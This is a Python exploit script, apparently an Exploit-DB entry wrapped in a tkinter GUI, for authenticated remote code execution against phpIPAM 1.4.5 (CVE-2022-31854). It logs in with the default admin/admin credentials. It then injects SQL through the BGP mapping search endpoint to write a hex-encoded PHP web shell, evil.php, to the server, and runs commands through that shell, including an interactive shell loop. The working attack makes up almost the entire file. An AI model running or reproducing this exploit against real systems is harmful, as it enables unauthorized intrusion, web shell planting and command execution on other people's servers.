# Exploit Title: phpIPAM 1.4.5 - Remote Code Execution (RCE) (Authenticated)
# Date: 2022-04-10
# Exploit Author: Guilherme '@behiNdyk1' Alves
# Vendor Homepage: https://phpipam.net/
# Software Link: https://github.com/phpipam/phpipam/releases/tag/v1.4.5
# Version: 1.4.5
# Tested on: Linux Ubuntu 20.04.3 LTS

#!/usr/bin/env python3

import requests
import argparse
from sys import exit, argv
from termcolor import colored
import tkinter
from tkinter import *
import tkinter as tk
from tkinter.ttk import *
from time import strftime
from tkinter import ttk
def phpIPAM():
    root = tkinter.Tk()
    root.title("CVE_2022_31854 exploits")
    root.geometry('800x600+0+0')
    def printInput():
        inp = inputtxt.get(1.0, "end-1c")
        lbl.config(text = "attack url : "+inp)
        url = inp
        scroll_y = Scrollbar(root, orient=VERTICAL)
        txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
        scroll_y.pack(side=RIGHT, fill=Y)
        scroll_y.config(command=txtarea.yview)
        banner = """
        █▀█ █░█ █▀█ █ █▀█ ▄▀█ █▀▄▀█   ▄█ ░ █░█ ░ █▀   █▀ █▀█ █░░ █   ▀█▀ █▀█   █▀█ █▀▀ █▀▀
        █▀▀ █▀█ █▀▀ █ █▀▀ █▀█ █░▀░█   ░█ ▄ ▀▀█ ▄ ▄█   ▄█ ▀▀█ █▄▄ █   ░█░ █▄█   █▀▄ █▄▄ ██▄

        █▄▄ █▄█   █▄▄ █▀▀ █░█ █ █▄░█ █▀▄ █▄█ █▀ █▀▀ █▀▀
        █▄█ ░█░   █▄█ ██▄ █▀█ █ █░▀█ █▄▀ ░█░ ▄█ ██▄ █▄▄\n"""
 
        txtarea.insert(END, banner)
        txtarea.pack(fill=BOTH, expand=True)
        txtarea.configure(state ='disabled')
        username = "admin"
        password = "admin"
        command = "id"
        path = "/system/writable/path/to/save/shell"

# Validating url
        if url.endswith("/"):
	        url = url[:-1]
        if not url.startswith("http://") and not url.startswith("https://"):
	    #print(colored("[!] Please specify a valid scheme (http:// or https://) before the domain.", "yellow"))
            txtarea.insert(END, "[!] Please specify a valid scheme (http:// or https://) before the domain.")
        #exit()

        def login(url, username, password):
            """Takes an username and a password and tries to execute a login (IPAM)"""
            data = {
            "ipamusername": username,
            "ipampassword": password
            }

	    #print(colored(f"[...] Trying to log in as {username}", "blue"))
            r = requests.post(f"{url}/app/login/login_check.php", data=data)
            if "Invalid username or password" in r.text:
                txtarea.insert(END, "[...] Trying to log in as admin\n")
		    #print(colored(f"[-] There's an error when trying to log in using these credentials --> {username}:{password}", "red"))
           # exit()
            else:
                txtarea.insert(END, "[+] Login successful!\n")
		   # print(colored("[+] Login successful!", "green"))
                return str(r.cookies)

        auth_cookie = login(url, username, password)

        def exploit(url, auth_cookie, path, command):
            txtarea.insert(END, "[...] Exploiting")
	    #print(colored("[...] Exploiting", "blue"))
            vulnerable_path = "app/admin/routing/edit-bgp-mapping-search.php"
            data = {
	        "subnet": f"\" Union Select 1,0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d,3,4 INTO OUTFILE '{path}/evil.php' -- -",
	        "bgp_id": "1"
            }
            cookies = {
	        "phpipam": auth_cookie
            }
            requests.post(f"{url}/{vulnerable_path}", data=data, cookies=cookies)
            test = requests.get(f"{url}/evil.php")
            if test.status_code != 200:
                return txtarea.insert(END, f"[-] Something went wrong. Maybe the path isn't writable. You can still abuse of the SQL injection vulnerability at {url}/index.php?page=tools&section=routing&subnetId=bgp&sPage=1")#print(colored(f"[-] Something went wrong. Maybe the path isn't writable. You can still abuse of the SQL injection vulnerability at {url}/index.php?page=tools&section=routing&subnetId=bgp&sPage=1", "red"))
            if "--shell" in argv:
                while True:
                    command = input("Shell> ")
                    r = requests.get(f"{url}/evil.php?cmd={command}")
                    txtarea.insert(END, r.text)#print(r.text)
            else:
                txtarea.insert(END, f"[+] Success! The shell is located at {url}/evil.php. Parameter: cmd")
	   	    #print(colored(f"[+] Success! The shell is located at {url}/evil.php. Parameter: cmd", "green"))
                r = requests.get(f"{url}/evil.php?cmd={command}")
                txtarea.insert(END, f"\n\n[+] Output:\n{r.text}")
		    #print(f"\n\n[+] Output:\n{r.text}")

        exploit(url, auth_cookie, path, command)
    Hacher = Label(root, text="Enter url or domin https://www.example.com/api/v3 : ").pack()
    inputtxt = tk.Text(root,height = 1,width = 80)
    inputtxt.pack()
    printButton = tk.Button(root,text = "exploit", command = printInput)
    printButton.pack()
    lbl = tk.Label(root, text = "")
    lbl.pack()
    root.mainloop()
